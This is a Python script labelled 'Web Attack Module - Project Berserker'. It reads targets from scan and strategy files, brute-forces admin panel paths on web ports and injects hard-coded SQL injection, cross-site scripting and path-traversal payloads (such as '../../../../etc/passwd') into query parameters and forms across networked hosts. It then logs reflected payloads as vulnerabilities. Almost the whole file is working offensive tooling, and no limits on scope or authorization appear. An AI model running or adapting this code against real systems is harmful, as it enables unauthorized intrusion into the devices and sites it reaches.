import os
import json
import argparse
import requests
import ipaddress
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import urllib3

CONTEXT_FILE = "data/context/context.json"
STRATEGY_DIR = "data/strategy"
ADMIN_WORDLIST = "/usr/share/wordlists/admin_panels.txt"
LOG_FILE = "logs/web_attack.log"
OUTPUT_DIR = "data/web_attack_results/"
DEFAULT_UA = "ProjectBerserkir"

os.makedirs("logs", exist_ok=True)
os.makedirs(OUTPUT_DIR, exist_ok=True)
urllib3.disable_warnings()

sql_payloads = ["' OR 1=1--", "' OR 'a'='a", "' UNION SELECT NULL--", "' OR sleep(5)--"]
xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert('xss')>", "'><svg onload=alert(1)>", "<body onload=alert('XSS')>"]
lfi_payloads = ["../../../../etc/passwd", "../boot.ini", "../../../../windows/win.ini"]

def get_args():
    parser = argparse.ArgumentParser(description="Web Attack Module - Project Berserker")
    parser.add_argument("--user-agent", type=str, default=DEFAULT_UA)
    parser.add_argument("--insecure", action="store_true")
    return parser.parse_args()

def get_headers(user_agent):
    return {"User-Agent": user_agent}

def log(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {msg}\n")
    print(f"[~] {msg}", flush=True)

def get_latest_strategy_file():
    try:
        files = [f for f in os.listdir(STRATEGY_DIR) if f.startswith("strategy_map_") and f.endswith(".json")]
        if not files:
            return None
        latest = max(files, key=lambda f: os.path.getmtime(os.path.join(STRATEGY_DIR, f)))
        return os.path.join(STRATEGY_DIR, latest)
    except:
        return None

def is_gateway_ip(ip):
    try:
        return ipaddress.IPv4Address(ip).packed[-1] == 1
    except:
        return False

def load_targets():
    strategy_path = get_latest_strategy_file()
    if not os.path.exists(CONTEXT_FILE) or not strategy_path:
        log("[!] Context or strategy file missing.")
        return []

    with open(CONTEXT_FILE) as f:
        context = json.load(f)
    with open(strategy_path) as f:
        strategy = json.load(f)

    web_targets = [ip for ip, mods in strategy.items() if "web_attack" in mods]
    targets = []

    for ip in web_targets:
        if is_gateway_ip(ip):
            continue
        device = context["devices"].get(ip)
        if not device:
            continue
        for port in device.get("protocols", {}).get("tcp", []):
            if port.get("state") == "open" and port.get("port") in [80, 443]:
                scheme = "https" if port["port"] == 443 else "http"
                targets.append(f"{scheme}://{ip}:{port['port']}")
    return targets

def check_admin_panels(base_url, user_agent, verify):
    found = []
    if not os.path.exists(ADMIN_WORDLIST):
        return found
    with open(ADMIN_WORDLIST) as f:
        paths = [line.strip() for line in f if line.strip()][:50]
    for path in paths:
        url = urljoin(base_url + "/", path)
        try:
            r = requests.get(url, timeout=2, verify=verify, headers=get_headers(user_agent), allow_redirects=True)
            if r.status_code in [200, 401, 403]:
                found.append(url)
        except:
            continue
    return found

def test_single_form(form, base_url, user_agent, payloads, verify):
    results = []
    action = form.get("action") or ""
    method = form.get("method", "get").lower()
    form_url = urljoin(base_url, action)
    inputs = form.find_all("input")

    if all(not inp.get("name") for inp in inputs):
        return [{
            "form_url": form_url,
            "method": method,
            "input_count": len(inputs),
            "result": "no_named_inputs"
        }]

    for payload in payloads:
        data = {inp.get("name"): payload for inp in inputs if inp.get("name")}
        try:
            if method == "post":
                resp = requests.post(form_url, data=data, timeout=2, verify=verify, headers=get_headers(user_agent))
            else:
                resp = requests.get(form_url, params=data, timeout=2, verify=verify, headers=get_headers(user_agent))
            if payload in resp.text:
                results.append({
                    "form_url": form_url,
                    "method": method,
                    "input_count": len(inputs),
                    "payload": payload,
                    "result": "vulnerable"
                })
        except:
            continue
    return results

def test_forms(base_url, user_agent, payloads, verify):
    try:
        r = requests.get(base_url, timeout=2, verify=verify, headers=get_headers(user_agent))
        soup = BeautifulSoup(r.text, "lxml")
        forms = soup.find_all("form")
        log(f"[DEBUG] Found {len(forms)} form(s) on {base_url}")

        results = []
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(test_single_form, form, base_url, user_agent, payloads, verify) for form in forms]
            for future in futures:
                results.extend(future.result())
        return results
    except:
        return []

def test_get_params(base_url, payloads, verify, user_agent, vuln_type):
    results = []
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query)
    if not qs:
        return []
    for param in qs:
        for payload in payloads:
            new_qs = {k: (payload if k == param else v[0]) for k, v in qs.items()}
            url = parsed._replace(query="&".join(f"{k}={v}" for k, v in new_qs.items())).geturl()
            try:
                resp = requests.get(url, timeout=2, verify=verify, headers=get_headers(user_agent))
                if payload in resp.text:
                    results.append({
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "type": vuln_type
                    })
            except:
                continue
    return results

def test_sqli_xss_lfi(base_url, user_agent, verify):
    results = {
        "sql": [], "xss": [], "lfi": [],
        "form_metadata": []
    }

    get_checks = [
        (sql_payloads, "sql"),
        (xss_payloads, "xss"),
        (lfi_payloads, "lfi")
    ]

    for payloads, vtype in get_checks:
        results[vtype].extend(test_get_params(base_url + "?input=test", payloads, verify, user_agent, vtype))

    for payloads, vtype in get_checks:
        for form_result in test_forms(base_url, user_agent, payloads, verify):
            if isinstance(form_result, dict) and form_result.get("result") == "vulnerable":
                results[vtype].append(form_result["form_url"] + f" [form {form_result['method'].upper()}]")
            results["form_metadata"].append(form_result)

    return results

def main():
    args = get_args()
    user_agent = args.user_agent
    verify = not args.insecure

    log("Starting web attack module...")
    log(f"Using User-Agent: {user_agent}")
    log(f"SSL Verification: {verify}")

    targets = load_targets()
    all_results = []

    for url in targets:
        log(f"Testing → {url}")
        panel_hits = check_admin_panels(url, user_agent, verify)
        vulns = test_sqli_xss_lfi(url, user_agent, verify)

        for panel_url in panel_hits:
            panel_vulns = test_sqli_xss_lfi(panel_url, user_agent, verify)
            for key in ["sql", "xss", "lfi"]:
                vulns[key].extend(panel_vulns[key])
            vulns["form_metadata"].extend(panel_vulns["form_metadata"])

        result = {
            "target": url,
            "admin_panels": panel_hits,
            "sqli": list(set(vulns["sql"])),
            "xss": list(set(vulns["xss"])),
            "lfi": list(set(vulns["lfi"])),
            "form_metadata": vulns["form_metadata"]
        }

        all_results.append(result)

    out_path = os.path.join(OUTPUT_DIR, f"web_attack_{datetime.now().strftime('%Y_%m_%d_%H_%M')}.json")
    with open(out_path, "w") as f:
        json.dump({"results": all_results}, f, indent=4)

    log(f"Web attack complete. Results saved to {out_path}")

if __name__ == "__main__":
    main()
